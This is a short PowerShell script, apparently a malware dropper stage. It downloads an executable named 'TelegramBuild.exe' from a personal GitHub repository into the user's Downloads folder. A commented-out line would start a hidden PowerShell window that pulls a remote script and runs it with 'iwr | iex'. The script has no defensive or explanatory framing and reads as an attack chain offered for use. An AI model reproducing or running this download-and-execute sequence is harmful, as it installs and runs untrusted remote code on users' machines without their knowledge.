$Source = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.exe"  
$Destination = "C:\Users\$env:USERNAME\Downloads\"  
Invoke-WebRequest -Uri $source -OutFile $Destination 

#run the next script
#Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
